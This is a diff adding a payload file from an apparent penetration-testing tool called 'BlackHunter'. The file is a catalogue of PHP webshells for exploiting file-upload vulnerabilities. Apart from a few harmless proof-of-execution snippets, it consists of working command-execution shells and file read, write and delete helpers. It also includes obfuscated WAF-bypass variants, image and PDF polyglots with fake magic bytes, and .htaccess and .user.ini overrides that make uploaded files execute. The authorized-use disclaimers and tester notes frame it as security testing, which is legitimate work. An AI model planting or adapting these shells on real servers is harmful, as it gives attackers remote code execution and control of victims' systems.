@@ -1,0 +1,542 @@
+# ============================================================
+# BlackHunter — Upload Payloads: PHP Shells
+# ============================================================
+# Purpose : Verify whether an uploaded PHP file executes on the
+#           target. Used AFTER a file-upload vulnerability has
+#           been confirmed (see vulns/upload.py).
+# Use     : Authorized testing ONLY. See docs/ethical_guidelines.md
+# Format  : Each entry is a block delimited by [name] ... [/name].
+#           The "filename" directive sets the recommended name.
+#           The body between ---BEGIN--- and ---END--- is the
+#           exact file content to write to disk.
+# Warning : These are functional webshells. On an authorized
+#           engagement, prefer the harmless "proof" payloads
+#           (phpinfo, echo) to confirm execution. Only upload a
+#           command shell if the RoE explicitly allows it, and
+#           remove it before the engagement ends.
+# ============================================================
+
+
+# ------------------------------------------------------------
+# 1. Harmless proof-of-execution (PREFERRED)
+# ------------------------------------------------------------
+[php_proof_echo]
+filename: proof.php
+---BEGIN---
+<?php echo "BLACKHUNTER_UPLOAD_OK"; ?>
+---END---
+[/php_proof_echo]
+
+[php_proof_phpinfo]
+filename: info.php
+---BEGIN---
+<?php phpinfo(); ?>
+---END---
+[/php_proof_phpinfo]
+
+[php_proof_math]
+filename: calc.php
+---BEGIN---
+<?php echo 7*191; /* 1337 */ ?>
+---END---
+[/php_proof_math]
+
+[php_proof_uname]
+filename: sysinfo.php
+---BEGIN---
+<?php echo php_uname(); ?>
+---END---
+[/php_proof_uname]
+
+
+# ------------------------------------------------------------
+# 2. Minimal command execution (GET parameter)
+# ------------------------------------------------------------
+[php_cmd_get]
+filename: cmd.php
+---BEGIN---
+<?php system($_GET['c']); ?>
+---END---
+[/php_cmd_get]
+
+[php_cmd_get_passthru]
+filename: cmd2.php
+---BEGIN---
+<?php passthru($_GET['c']); ?>
+---END---
+[/php_cmd_get_passthru]
+
+[php_cmd_get_shell_exec]
+filename: cmd3.php
+---BEGIN---
+<?php echo shell_exec($_GET['c']); ?>
+---END---
+[/php_cmd_get_shell_exec]
+
+[php_cmd_get_exec]
+filename: cmd4.php
+---BEGIN---
+<?php echo exec($_GET['c']); ?>
+---END---
+[/php_cmd_get_exec]
+
+[php_cmd_get_popen]
+filename: cmd5.php
+---BEGIN---
+<?php $h=popen($_GET['c'],'r'); while(!feof($h)){echo fread($h,1024);} pclose($h); ?>
+---END---
+[/php_cmd_get_popen]
+
+[php_cmd_get_proc_open]
+filename: cmd6.php
+---BEGIN---
+<?php $p=proc_open($_GET['c'],array(1=>array('pipe','w')),$pipes); echo stream_get_contents($pipes[1]); ?>
+---END---
+[/php_cmd_get_proc_open]
+
+
+# ------------------------------------------------------------
+# 3. Command execution with output buffering / filtering
+# ------------------------------------------------------------
+[php_cmd_get_trimmed]
+filename: cmd7.php
+---BEGIN---
+<?php echo "<pre>".shell_exec($_GET['c'])."</pre>"; ?>
+---END---
+[/php_cmd_get_trimmed]
+
+[php_cmd_get_base64]
+filename: cmd8.php
+---BEGIN---
+<?php echo base64_encode(shell_exec($_GET['c'])); ?>
+---END---
+[/php_cmd_get_base64]
+
+[php_cmd_get_html]
+filename: cmd9.php
+---BEGIN---
+<?php echo htmlspecialchars(shell_exec($_GET['c'])); ?>
+---END---
+[/php_cmd_get_html]
+
+[php_cmd_get_disabled_fallback]
+filename: cmd10.php
+---BEGIN---
+<?php
+$funcs = ['system','shell_exec','passthru','exec','popen','proc_open'];
+foreach ($funcs as $f) {
+    if (function_exists($f) && !in_array($f, explode(',', ini_get('disable_functions')))) {
+        echo "[$f] "; $f($_GET['c']); echo "\n"; break;
+    }
+}
+?>
+---END---
+[/php_cmd_get_disabled_fallback]
+
+
+# ------------------------------------------------------------
+# 4. POST-based command execution
+# ------------------------------------------------------------
+[php_cmd_post]
+filename: cmdp.php
+---BEGIN---
+<?php system($_POST['c']); ?>
+---END---
+[/php_cmd_post]
+
+[php_cmd_request]
+filename: cmdr.php
+---BEGIN---
+<?php system($_REQUEST['c']); ?>
+---END---
+[/php_cmd_request]
+
+[php_cmd_cookie]
+filename: cmdc.php
+---BEGIN---
+<?php system($_COOKIE['c']); ?>
+---END---
+[/php_cmd_cookie]
+
+[php_cmd_header]
+filename: cmdh.php
+---BEGIN---
+<?php system(getallheaders()['X-Command']); ?>
+---END---
+[/php_cmd_header]
+
+
+# ------------------------------------------------------------
+# 5. File manager / read / write helpers
+# ------------------------------------------------------------
+[php_file_read]
+filename: read.php
+---BEGIN---
+<?php echo file_get_contents($_GET['f']); ?>
+---END---
+[/php_file_read]
+
+[php_file_read_b64]
+filename: readb64.php
+---BEGIN---
+<?php echo base64_encode(file_get_contents($_GET['f'])); ?>
+---END---
+[/php_file_read_b64]
+
+[php_file_write]
+filename: write.php
+---BEGIN---
+<?php file_put_contents($_GET['f'], $_GET['d']); echo "WROTE"; ?>
+---END---
+[/php_file_write]
+
+[php_file_upload]
+filename: up.php
+---BEGIN---
+<?php move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); echo "UP"; ?>
+---END---
+[/php_file_upload]
+
+[php_file_list]
+filename: ls.php
+---BEGIN---
+<?php echo implode("\n", scandir($_GET['d'] ?? '.')); ?>
+---END---
+[/php_file_list]
+
+[php_file_delete]
+filename: rm.php
+---BEGIN---
+<?php unlink($_GET['f']); echo "DEL"; ?>
+---END---
+[/php_file_delete]
+
+[php_file_download]
+filename: dl.php
+---BEGIN---
+<?php
+$f = $_GET['f'];
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="'.basename($f).'"');
+readfile($f);
+?>
+---END---
+[/php_file_download]
+
+
+# ------------------------------------------------------------
+# 6. Info / recon (what can this shell do?)
+# ------------------------------------------------------------
+[php_recon]
+filename: recon.php
+---BEGIN---
+<?php
+echo "USER: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user()) . "\n";
+echo "UNAME: " . php_uname() . "\n";
+echo "CWD: " . getcwd() . "\n";
+echo "PHP: " . PHP_VERSION . "\n";
+echo "SAPI: " . php_sapi_name() . "\n";
+echo "DISABLED: " . ini_get('disable_functions') . "\n";
+echo "OPEN_BASEDIR: " . ini_get('open_basedir') . "\n";
+echo "SAFE_MODE: " . ini_get('safe_mode') . "\n";
+echo "DOC_ROOT: " . ($_SERVER['DOCUMENT_ROOT'] ?? '') . "\n";
+echo "SERVER: " . ($_SERVER['SERVER_SOFTWARE'] ?? '') . "\n";
+echo "OS: " . PHP_OS . "\n";
+echo "EXT: " . implode(',', get_loaded_extensions()) . "\n";
+?>
+---END---
+[/php_recon]
+
+
+# ------------------------------------------------------------
+# 7. Short / minimised shells (WAF / length bypass)
+# ------------------------------------------------------------
+[php_short_system]
+filename: s.php
+---BEGIN---
+<?=`$_GET[0]`?>
+---END---
+[/php_short_system]
+
+[php_short_system_2]
+filename: s2.php
+---BEGIN---
+<?=`$_GET[c]`;?>
+---END---
+[/php_short_system_2]
+
+[php_short_eval]
+filename: s3.php
+---BEGIN---
+<?php @eval($_GET['c']); ?>
+---END---
+[/php_short_eval]
+
+[php_short_assert]
+filename: s4.php
+---BEGIN---
+<?php @assert($_GET['c']); ?>
+---END---
+[/php_short_assert]
+
+[php_short_create_function]
+filename: s5.php
+---BEGIN---
+<?php $f='cre'.'ate_fun'.'ction'; $f('',$_GET['c']); ?>
+---END---
+[/php_short_create_function]
+
+[php_short_preg_replace]
+filename: s6.php
+---BEGIN---
+<?php preg_replace('/.*/e', $_GET['c'], ''); ?>
+---END---
+[/php_short_preg_replace]
+
+
+# ------------------------------------------------------------
+# 8. Obfuscated / WAF-bypass variants
+# ------------------------------------------------------------
+[php_obf_concat]
+filename: o1.php
+---BEGIN---
+<?php $a='sys'; $b='tem'; $a.$b($_GET['c']); ?>
+---END---
+[/php_obf_concat]
+
+[php_obf_variable_function]
+filename: o2.php
+---BEGIN---
+<?php $f=$_GET['f']; $f($_GET['c']); ?>
+---END---
+[/php_obf_variable_function]
+
+[php_obf_chr]
+filename: o3.php
+---BEGIN---
+<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['c']); ?>
+---END---
+[/php_obf_chr]
+
+[php_obf_base64]
+filename: o4.php
+---BEGIN---
+<?php eval(base64_decode($_GET['c'])); ?>
+---END---
+[/php_obf_base64]
+
+[php_obf_rot13]
+filename: o5.php
+---BEGIN---
+<?php eval(str_rot13($_GET['c'])); ?>
+---END---
+[/php_obf_rot13]
+
+[php_obf_gzinflate]
+filename: o6.php
+---BEGIN---
+<?php eval(gzinflate(base64_decode($_GET['c']))); ?>
+---END---
+[/php_obf_gzinflate]
+
+[php_obf_hex]
+filename: o7.php
+---BEGIN---
+<?php $f=hex2bin('73797374656d'); $f($_GET['c']); ?>
+---END---
+[/php_obf_hex]
+
+[php_obf_array_map]
+filename: o8.php
+---BEGIN---
+<?php array_map('system', [$_GET['c']]); ?>
+---END---
+[/php_obf_array_map]
+
+[php_obf_call_user_func]
+filename: o9.php
+---BEGIN---
+<?php call_user_func('system', $_GET['c']); ?>
+---END---
+[/php_obf_call_user_func]
+
+[php_obf_reflection]
+filename: o10.php
+---BEGIN---
+<?php (new ReflectionFunction('system'))->invoke($_GET['c']); ?>
+---END---
+[/php_obf_reflection]
+
+[php_obf_backtick_var]
+filename: o11.php
+---BEGIN---
+<?php $c=$_GET['c']; echo `$c`; ?>
+---END---
+[/php_obf_backtick_var]
+
+
+# ------------------------------------------------------------
+# 9. Filesystem / extension bypass bodies
+#    (pair with extensions.txt and mime_types.txt)
+# ------------------------------------------------------------
+[php_bypass_gif_header]
+filename: shell.php.gif
+---BEGIN---
+GIF89a
+<?php system($_GET['c']); ?>
+---END---
+[/php_bypass_gif_header]
+
+[php_bypass_png_header]
+filename: shell.php.png
+---BEGIN---
+\x89PNG\r\n\x1a\n
+<?php system($_GET['c']); ?>
+---END---
+[/php_bypass_png_header]
+
+[php_bypass_jpg_header]
+filename: shell.php.jpg
+---BEGIN---
+\xff\xd8\xff\xe0
+<?php system($_GET['c']); ?>
+---END---
+[/php_bypass_jpg_header]
+
+[php_bypass_pdf_header]
+filename: shell.php.pdf
+---BEGIN---
+%PDF-1.4
+<?php system($_GET['c']); ?>
+---END---
+[/php_bypass_pdf_header]
+
+[php_bypass_zip]
+filename: shell.php.zip
+---BEGIN---
+PK\x03\x04
+<?php system($_GET['c']); ?>
+---END---
+[/php_bypass_zip]
+
+
+# ------------------------------------------------------------
+# 10. .htaccess payloads (make non-PHP extensions execute)
+# ------------------------------------------------------------
+[htaccess_php_all]
+filename: .htaccess
+---BEGIN---
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .abc
+---END---
+[/htaccess_php_all]
+
+[htaccess_php_handler]
+filename: .htaccess
+---BEGIN---
+<FilesMatch "\.(jpg|png|gif|txt|abc)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+---END---
+[/htaccess_php_handler]
+
+[htaccess_php_engine]
+filename: .htaccess
+---BEGIN---
+php_value engine On
+AddHandler application/x-httpd-php .xyz
+---END---
+[/htaccess_php_engine]
+
+[htaccess_auto_prepend]
+filename: .htaccess
+---BEGIN---
+php_value auto_prepend_file /var/www/html/uploads/shell.php
+---END---
+[/htaccess_auto_prepend]
+
+
+# ------------------------------------------------------------
+# 11. .user.ini payloads (PHP-FPM / CGI)
+# ------------------------------------------------------------
+[userini_auto_prepend]
+filename: .user.ini
+---BEGIN---
+auto_prepend_file=/var/www/html/uploads/shell.php
+---END---
+[/userini_auto_prepend]
+
+[userini_auto_append]
+filename: .user.ini
+---BEGIN---
+auto_append_file=/var/www/html/uploads/shell.php
+---END---
+[/userini_auto_append]
+
+
+# ------------------------------------------------------------
+# 12. Polyglot / chained payloads
+# ------------------------------------------------------------
+[php_polyglot_gif_short]
+filename: p.gif.php
+---BEGIN---
+GIF89a<?=`$_GET[0]`?>
+---END---
+[/php_polyglot_gif_short]
+
+[php_polyglot_jpg_system]
+filename: p.jpg.php
+---BEGIN---
+\xff\xd8\xff\xe0<?php system($_GET['c']); ?>
+---END---
+[/php_polyglot_jpg_system]
+
+[php_polyglot_svg]
+filename: p.svg.php
+---BEGIN---
+<svg xmlns="http://www.w3.org/2000/svg"><?php system($_GET['c']); ?></svg>
+---END---
+[/php_polyglot_svg]
+
+[php_polyglot_xml]
+filename: p.xml.php
+---BEGIN---
+<?xml version="1.0"?><?php system($_GET['c']); ?>
+---END---
+[/php_polyglot_xml]
+
+
+# ============================================================
+# Notes for testers
+# ============================================================
+# 1. Confirm execution BEFORE uploading a real shell.
+#    Upload proof.php, request it, and look for the literal
+#    string "BLACKHUNTER_UPLOAD_OK". If you don't see it, the
+#    file was uploaded but not executed — move on to bypass
+#    techniques (extensions.txt, mime_types.txt, .htaccess).
+#
+# 2. Short tags (`<?=`) require short_open_tag=On (default
+#    since PHP 5.4 for `<?=`). If they fail, use `<?php`.
+#
+# 3. disabled_functions and open_basedir are the two most
+#    common blockers. Always run recon.php first to see what
+#    is available before assuming a shell is broken.
+#
+# 4. WAF bypass: the obfuscated variants (concat, chr, base64,
+#    reflection, variable functions) are ordered from mildest
+#    to most aggressive. Try them in order.
+#
+# 5. .htaccess works only on Apache with AllowOverride set.
+#    .user.ini works on PHP-FPM/CGI (not mod_php).
+#
+# 6. Do NOT leave a shell behind. Delete it before the
+#    engagement ends, and document the exact path + hash in
+#    the report as evidence of the finding.
+#
+# 7. On a real engagement, prefer a single, minimal proof
+#    payload. A dozen shells in an upload directory is noisy
+#    and dangerous if the client's monitoring is slow.
+# ============================================================
